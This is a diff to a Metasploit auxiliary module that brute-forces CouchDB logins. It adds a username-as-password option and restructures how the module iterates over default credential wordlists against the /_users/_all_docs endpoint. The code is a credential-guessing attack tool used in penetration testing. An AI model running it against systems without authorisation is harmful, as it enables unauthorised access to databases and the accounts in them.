@@ -23,13 +23,14 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(5984),
-				OptString.new('TARGETURI', [false, "TARGETURI for CouchDB. Default here is /_users/_all_docs", "/"]),
+				OptString.new('TARGETURI', [false, "TARGETURI for CouchDB. Default here is /", "/"]),
 				OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
 					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_userpass.txt") ]),
 				OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
 					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_users.txt") ]),
 				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
-					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ])
+					File.join(Msf::Config.install_root, "data", "wordlists", "http_default_pass.txt") ]),
+				OptBool.new('USER_AS_PASS', [ false, "Try the username as the password for all users", false]),
 			], self.class)
 	end
 
@@ -38,9 +39,17 @@ class Metasploit3 < Msf::Auxiliary
 		user = datastore['USERNAME'].to_s
 		pass = datastore['PASSWORD'].to_s
 
+		if user.nil? || user.strip == ''
+			each_user_pass do |user, pass|
+				do_login(user, pass)
+			end
+			return
+		end
+
 		vprint_status("#{rhost}:#{rport} - Trying to login with '#{user}' : '#{pass}'")
 
 			uri = target_uri.path
+
 			res = send_request_cgi({
 				'uri'    => normalize_uri(uri, '_users/_all_docs'),
 				'method' => 'GET',
@@ -55,11 +64,8 @@ class Metasploit3 < Msf::Auxiliary
 				vprint_good("#{rhost}:#{rport} - Successful login with '#{user}' : '#{pass}'")
 			else
 				vprint_error("#{rhost}:#{rport} - Failed login with '#{user}' : '#{pass}'")
-				print_status("Brute-forcing... >:-} ")
-				each_user_pass do |user, pass|
-					do_login(user, pass)
-				end
 			end
+
 		rescue ::Rex::ConnectionError
 			vprint_error("'#{rhost}':'#{rport}' - Failed to connect to the web server")
 	end
@@ -67,6 +73,7 @@ class Metasploit3 < Msf::Auxiliary
 	def do_login(user, pass)
 		vprint_status("Trying username:'#{user}' with password:'#{pass}'")
 		begin
+
 			uri = target_uri.path
 			res = send_request_cgi(
 			{
